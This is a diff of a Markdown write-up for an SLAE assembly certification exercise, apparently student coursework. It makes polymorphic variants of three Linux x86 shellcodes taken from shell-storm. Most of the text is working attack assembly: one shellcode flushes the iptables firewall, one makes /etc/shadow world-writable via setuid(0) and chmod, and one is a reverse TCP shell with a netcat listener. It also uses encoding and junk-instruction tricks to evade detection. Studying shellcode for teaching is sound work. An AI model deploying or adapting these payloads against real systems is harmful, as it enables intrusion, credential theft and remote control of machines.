@@ -1,36 +1,36 @@
-# Note
+# Note
 
 This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.
 
-# Choosing shellcodes
+# Choosing shellcodes
 
-For the polymorphishm exercices, I decided to choose three shellcodes from different author with a real offensive usage. In my humble opinion, send Phuck3d! to all terminals (http://shell-storm.org/shellcode/files/shellcode-604.php) or open the CD drive (http://shell-storm.org/shellcode/files/shellcode-621.php/http://shell-storm.org/shellcode/files/shellcode-653.php) does not have real usage in an offensive assessment. 
+For the polymorphism exercises, I decided to choose three shellcodes from different authors with a real offensive usage. In my humble opinion, send Phuck3d! to all terminals (http://shell-storm.org/shellcode/files/shellcode-604.php) or open the CD drive (http://shell-storm.org/shellcode/files/shellcode-621.php/http://shell-storm.org/shellcode/files/shellcode-653.php) does not have real usage in an offensive assessment. 
 
-#  Linux/x86 - iptables -F - 58 bytes by dev0id
+#  Linux/x86 - iptables -F - 58 bytes by dev0id
 Source: http://shell-storm.org/shellcode/files/shellcode-361.php
 
 ## Original shellcode
 
 ```ASM
-jmp	short	callme
+jmp short callme
 main:
-	pop	esi
-	xor	eax,eax
-	mov byte [esi+14],al
-	mov byte [esi+17],al
-	mov long [esi+18],esi
-	lea	 ebx,[esi+15]
-	mov long [esi+22],ebx
-	mov long [esi+26],eax
-	mov 	al,0x0b
-	mov	ebx,esi
-	lea	ecx,[esi+18]
-	lea	edx,[esi+26]
-	int	0x80
-	
+ pop esi
+ xor eax,eax
+ mov byte [esi+14],al
+ mov byte [esi+17],al
+ mov long [esi+18],esi
+ lea  ebx,[esi+15]
+ mov long [esi+22],ebx
+ mov long [esi+26],eax
+ mov  al,0x0b
+ mov ebx,esi
+ lea ecx,[esi+18]
+ lea edx,[esi+26]
+ int 0x80
+ 
 callme:
-	call	main
-	db '/sbin/iptables#-F#'
+ call main
+ db '/sbin/iptables#-F#'
 ```
 
 This shellcode flush iptables rules (local Linux Firewall). In order to test the shellcode some rules must be set, with root privileges:
@@ -61,69 +61,69 @@ Polymorphism tricks will be:
 In order to decode the string a simple loop is used:
 ```ASM
 main:
-	pop	esi
-	mov ecx, eax ; Used for replace xor ecx, ecx
-	xor ecx, eax ;
-	mov cl, 17
+ pop esi
+ mov ecx, eax ; Used for replace xor ecx, ecx
+ xor ecx, eax ;
+ mov cl, 17
 
 decode:
-	inc byte [esi], 1
-	inc esi
-	loop decode
+ inc byte [esi], 1
+ inc esi
+ loop decode
 
-	sub esi, 17
+ sub esi, 17
 ```
 
 Lets move EXC into EAX to set EAX to zero and increment al as we decode the string.
 
 ```ASM
 main:
-	pop	esi
-	mov ecx, eax ; Used for not xor ecx, ecx
-	xor ecx, eax ;
-	mov eax, ecx
-	mov cl, 17
+ pop esi
+ mov ecx, eax ; Used for not xor ecx, ecx
+ xor ecx, eax ;
+ mov eax, ecx
+ mov cl, 17
 
 decode:
-	inc byte [esi], 1
-	inc esi
-	inc al
-	loop decode
+ inc byte [esi], 1
+ inc esi
+ inc al
+ loop decode
 ```
 
-At the end AL is set to 17, in order to set it to 0xb (11) lets substract 6 and add some junk code. At the end of the decode loop, EAX is set. EAX/AL cannot be used as a null byte, but ECX/CL can.
+At the end AL is set to 17, in order to set it to 0xb (11) lets subtract 6 and add some junk code. At the end of the decode loop, EAX is set. EAX/AL cannot be used as a null byte, but ECX/CL can.
 
 ```ASM
 main:
-	pop	esi
-	mov ecx, eax ; Used for not xor ecx, ecx
-	xor ecx, eax ;
-	mov eax, ecx
-	mov cl, 17
+ pop esi
+ mov ecx, eax ; Used for not xor ecx, ecx
+ xor ecx, eax ;
+ mov eax, ecx
+ mov cl, 17
 
 decode:
-	inc byte [esi], 1
-	inc esi
-	inc al
-	loop decode
+ inc byte [esi], 1
+ inc esi
+ inc al
+ loop decode
 
-	sub esi, 17
+ sub esi, 17
 
-	mov byte [esi+14],cl ;replace al by cl
-	mov byte [esi+17],cl ;replace al by cl
-	mov long [esi+18],esi
-	inc ebx ;do nothing
-	lea	 ebx,[esi+15]
-	mov long [esi+22],ebx
-	mov long [esi+26],ecx ;replace eax by ecx
-	sub al, 6
-	mov	ebx,esi
-	lea	ecx,[esi+18]
-	xchg ebx, ebx ;do nothing
-	lea	edx,[esi+26]
-	int	0x80
+ mov byte [esi+14],cl ;replace al by cl
+ mov byte [esi+17],cl ;replace al by cl
+ mov long [esi+18],esi
+ inc ebx ;do nothing
+ lea  ebx,[esi+15]
+ mov long [esi+22],ebx
+ mov long [esi+26],ecx ;replace eax by ecx
+ sub al, 6
+ mov ebx,esi
+ lea ecx,[esi+18]
+ xchg ebx, ebx ;do nothing
+ lea edx,[esi+26]
+ int 0x80
 ```
-Lets try this out!
+Let's try this out!
 
 ## Compilation
 ```sh
@@ -149,7 +149,7 @@ $ echo 'scale=3; 77/55*100' |bc
 140.000
 ```
 
-#  Linux/x86 - setuid(0) + chmod(/etc/shadow, 0666) - 37 Bytes by antrhacks
+#  Linux/x86 - setuid(0) + chmod(/etc/shadow, 0666) - 37 Bytes by antrhacks
 Source: http://shell-storm.org/shellcode/files/shellcode-608.php
 
 ## Original shellcode
@@ -193,20 +193,20 @@ inc    eax
 int    0x80
 ```
 
-A quick analyse of the shellcode shows that syscal 0x17 (23 / *setuid*) is called with 0. Then, *//etc/shadow* is pushed on the stack and syscal 0xF/15 (chmod) is called with 0x1b6 (666) as argument. Finally, if chmod suceed, 0xffffffff is put in EAX and syscall 0 (exit) is called.	
+A quick analyse of the shellcode shows that syscal 0x17 (23 / *setuid*) is called with 0. Then, *//etc/shadow* is pushed on the stack and syscal 0xF/15 (chmod) is called with 0x1b6 (666) as argument. Finally, if chmod suceed, 0xffffffff is put in EAX and syscall 0 (exit) is called. 
 
 ```sh
 $ grep 23 /usr/include/i386-linux-gnu/asm/unistd_32.h
-#define __NR_setuid		 23
+#define __NR_setuid   23
 $ grep 15 /usr/include/i386-linux-gnu/asm/unistd_32.h
-#define __NR_chmod		 15
+#define __NR_chmod   15
 $ grep 0 /usr/include/i386-linux-gnu/asm/unistd_32.h
 #define __NR_restart_syscall      0
 $ grep 1 /usr/include/i386-linux-gnu/asm/unistd_32.h
 #define __NR_exit
 ```
 
-Lets try this shellcode and restore access right on */etc/shadow*:
+Let's try this shellcode and restore access right on */etc/shadow*:
 
 ```sh
 $ ls -al /etc/shadow
@@ -285,12 +285,12 @@ $ echo "scale=3; 55/37*100" |bc
 148.600
 ```
 
-#  Linux/x86 - Shell Reverse TCP Shellcode - 74 bytes by Julien Ahrens
+#  Linux/x86 - Shell Reverse TCP Shellcode - 74 bytes by Julien Ahrens
 Source: http://shell-storm.org/shellcode/files/shellcode-883.php
 
 ## Original shellcode
 
-The original shellcode is a classic reverse shell as done in the first exercice.
+The original shellcode is a classic reverse shell as done in the first exercise.
 
 ```ASM
 *  00000000 <_start>:
@@ -354,62 +354,62 @@ global _start
 
 section .text
 _start:
-	push   0x66
-	pop    eax
-	push   0x1
-	pop    ebx
-	cdq
-	push   edx
-	push   ebx
-	push   0x2
-	mov    ecx,esp
-	int    0x80
-	xchg   edx,eax
-	mov    al,0x66
-	push   0x0101017f
-	inc eax ;junk
-	clz ;junk
-	clc ;junj
-	push word 0x3905 
-	dec eax ;junk
-	inc    ebx
-	push   bx
-	mov    ecx,esp
-	push   0x10
-	push   ecx
-	push   edx
-	mov    ecx,esp
-	inc    ebx
-	int    0x80
-	push   0x2
-	pop    ecx
-	cdq
+ push   0x66
+ pop    eax
+ push   0x1
+ pop    ebx
+ cdq
+ push   edx
+ push   ebx
+ push   0x2
+ mov    ecx,esp
+ int    0x80
+ xchg   edx,eax
+ mov    al,0x66
+ push   0x0101017f
+ inc eax ;junk
+ clz ;junk
+ clc ;junj
+ push word 0x3905 
+ dec eax ;junk
+ inc    ebx
+ push   bx
+ mov    ecx,esp
+ push   0x10
+ push   ecx
+ push   edx
+ mov    ecx,esp
+ inc    ebx
+ int    0x80
+ push   0x2
+ pop    ecx
+ cdq
 loop:
-	mov    al,0x2b
-	add al, 0x14
-	int    0x80
-	dec    ecx
-	jns    loop
+ mov    al,0x2b
+ add al, 0x14
+ int    0x80
+ dec    ecx
+ jns    loop
 
-	mov    al,0xd
-	sub al, 2
-	inc    ecx
-	push   ecx
-	mov edx, 0x01020304
-	mov esi, 0x69753233
-	sub esi, edx
-	push esi
-	mov esi, 0x6f6b6533
-	sub esi, edx
-	push esi
-	mov    edx,ecx
-	mov    ebx,esp
-	int    0x80
+ mov    al,0xd
+ sub al, 2
+ inc    ecx
+ push   ecx
+ mov edx, 0x01020304
+ mov esi, 0x69753233
+ sub esi, edx
+ push esi
+ mov esi, 0x6f6b6533
+ sub esi, edx
+ push esi
+ mov    edx,ecx
+ mov    ebx,esp
+ int    0x80
 ```
 
 ## Compilation
 
-Before running the shellcode, start a listerner on port 1337.
+Before running the shellcode, start a listener on port 1337.
 
 ```
 $ nc -lv 1337
